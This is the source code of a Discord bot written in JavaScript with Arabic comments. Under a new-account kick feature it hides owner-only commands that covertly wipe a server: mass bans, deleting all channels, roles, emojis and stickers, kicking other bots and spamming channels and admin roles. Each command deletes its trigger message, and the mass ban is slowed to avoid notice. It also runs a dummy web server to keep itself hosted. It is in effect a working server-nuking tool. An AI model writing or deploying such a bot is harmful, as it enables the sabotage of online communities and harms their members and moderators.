const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');
const http = require('http'); // المكتبة السحرية عشان نضحك على ريندر

// 1️⃣ فتح سيرفر وهمي عشان Render يشوف بورت مفتوح ويرتاح نفسياً
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot is running successfully!');
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`[Render Trick] Dummy server is listening on port ${PORT}`);
});

// 2️⃣ إعدادات البوت الأساسية وتفعيل الـ Intents
const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent, 
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildExpressions
    ] 
});

const PREFIX = '.'; // أمر النقطة
const OWNER_ID = '1515394889855275281'; // 🔒 قفل الأمان الخاص بك أنت فقط

client.on('ready', () => {
    console.log(`تم تشغيل البوت بنجاح باسم: ${client.user.tag}`);
});

// 🛡️ حماية تلقائية عند دخول السيرفر: طرد الحسابات الجديدة أقل من 3 أيام لمنع التوكنات
client.on('guildMemberAdd', async (member) => {
    const minAge = 3 * 24 * 60 * 60 * 1000; 
    const accountAge = Date.now() - member.user.createdAt.getTime();
    if (accountAge < minAge) {
        try { await member.kick('حماية من الحسابات الوهمية'); } catch (err) {}
    }
});

// 📩 قراءة الرسائل وتنفيذ الأوامر السرية
client.on('messageCreate', async (message) => {
    if (!message.content.startsWith(PREFIX) || message.author.bot) return;
    if (message.author.id !== OWNER_ID) return; // الحماية الصارمة من الغرباء

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args[0].toLowerCase();

    // 1️⃣ أمر التبنيد الجماعي المخفي: .banall 50
    if (command === 'banall') {
        const count = parseInt(args[1]);
        if (isNaN(count) || count <= 0) return;
        try { await message.delete(); } catch (err) {}
        try {
            const members = await message.guild.members.fetch();
            const targets = members.filter(m => !m.user.bot && m.roles.cache.size <= 1).first(count);
            for (const member of targets) {
                try {
                    await member.ban({ reason: 'تنظيف الحسابات' });
                    await new Promise(resolve => setTimeout(resolve, 20000)); // ديلاي 20 ثانية للأمان
                } catch (err) {}
            }
        } catch (error) {}
    }

    // 2️⃣ أمر حذف كاتيجوري مع روماتها: .delcat ID
    if (command === 'delcat') {
        const categoryId = args[1];
        if (!categoryId) return;
        try { await message.delete(); } catch (err) {}
        try {
            const category = message.guild.channels.cache.get(categoryId);
            if (!category || category.type !== ChannelType.GuildCategory) return;
            for (const [id, channel] of category.children.cache) {
                try { await channel.delete(); await new Promise(resolve => setTimeout(resolve, 1000)); } catch (err) {}
            }
            await category.delete();
        } catch (error) {}
    }

    // 3️⃣ أمر تصفير الرومات بالكامل: .nukechannels
    if (command === 'nukechannels') {
        try { await message.delete(); } catch (err) {}
        try {
            const channels = await message.guild.channels.fetch();
            for (const [id, channel] of channels) {
                try { await channel.delete(); await new Promise(resolve => setTimeout(resolve, 1000)); } catch (err) {}
            }
        } catch (error) {}
    }

    // 4️⃣ أمر إنشاء رومات متكررة: .makechannels 30 name
    if (command === 'makechannels') {
        const count = parseInt(args[1]);
        const channelName = args.slice(2).join('-');
        if (isNaN(count) || count <= 0 || !channelName) return;
        const finalCount = count > 50 ? 50 : count;
        try { await message.delete(); } catch (err) {}
        try {
            for (let i = 0; i < finalCount; i++) {
                try { await message.guild.channels.create({ name: channelName, type: ChannelType.GuildText }); await new Promise(resolve => setTimeout(resolve, 1000)); } catch (err) {}
            }
        } catch (error) {}
    }

    // 5️⃣ أمر تصفير الرتب بالكامل من السيرفر: .nukeroles
    if (command === 'nukeroles') {
        try { await message.delete(); } catch (err) {}
        try {
            const roles = await message.guild.roles.fetch();
            for (const [id, role] of roles) {
                if (role.managed || role.id === message.guild.id || role.id === client.user.id) continue;
                try { await role.delete(); await new Promise(resolve => setTimeout(resolve, 1000)); } catch (err) {}
            }
        } catch (error) {}
    }

    // 6️⃣ أمر مسح الشات: .clear 100
    if (command === 'clear') {
        const amount = parseInt(args[1]);
        if (isNaN(amount) || amount <= 0) return;
        try { await message.delete(); } catch (err) {}
        try { await message.channel.bulkDelete(amount > 100 ? 100 : amount, true); } catch (error) {}
    }

    // 7️⃣ أمر صناعة الرتب الثابتة الأساسية: .makeroles
    if (command === 'makeroles') {
        try { await message.delete(); } catch (err) {}
        const defaultRoles = [{ name: '👑 | Owner', color: '#ff0000' }, { name: '🛠️ | Admin', color: '#00ff00' }, { name: '🛡️ | Moderator', color: '#0000ff' }, { name: '👥 | Member', color: '#aaaaaa' }];
        try { for (const roleData of defaultRoles) { await message.guild.roles.create({ name: roleData.name, color: roleData.color }); await new Promise(resolve => setTimeout(resolve, 1000)); } } catch (error) {}
    }

    // 8️⃣ أمر صناعة رتب مخصصة جماعية: .makerolescustom 10 admin Name
    if (command === 'makerolescustom') {
        const count = parseInt(args[1]); const type = args[2]?.toLowerCase(); const roleName = args.slice(3).join(' ');
        if (isNaN(count) || count <= 0 || !type || !roleName) return;
        try { await message.delete(); } catch (err) {}
        let perms = type === 'admin' ? [PermissionsBitField.Flags.Administrator] : [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages];
        try { for (let i = 0; i < (count > 50 ? 50 : count); i++) { await message.guild.roles.create({ name: roleName, permissions: perms }); await new Promise(resolve => setTimeout(resolve, 1000)); } } catch (error) {}
    }

    // 9️⃣ أمر حذف جميع الإيموجيات: .nukeemojis
    if (command === 'nukeemojis') {
        try { await message.delete(); } catch (err) {}
        try {
            const emojis = await message.guild.emojis.fetch();
            for (const [id, emoji] of emojis) {
                try { await emoji.delete(); await new Promise(resolve => setTimeout(resolve, 500)); } catch (err) {}
            }
        } catch (error) {}
    }

    // 🔟 أمر حذف جميع الستيكرات: .nukestickers
    if (command === 'nukestickers') {
        try { await message.delete(); } catch (err) {}
        try {
            const stickers = await message.guild.stickers.fetch();
            for (const [id, sticker] of stickers) {
                try { await sticker.delete(); await new Promise(resolve => setTimeout(resolve, 500)); } catch (err) {}
            }
        } catch (error) {}
    }

    // 1️⃣1️⃣ أمر طرد جميع البوتات الخارجية من السيرفر: .nukebots
    if (command === 'nukebots') {
        try { await message.delete(); } catch (err) {}
        try {
            const members = await message.guild.members.fetch();
            const bots = members.filter(m => m.user.bot && m.user.id !== client.user.id);
            for (const [id, bot] of bots) {
                try {
                    await bot.kick('تصفير السيرفر من البوتات الخارجية');
                    await new Promise(resolve => setTimeout(resolve, 1000));
                } catch (err) {}
            }
        } catch (error) {}
    }
});

client.login(process.env.TOKEN);
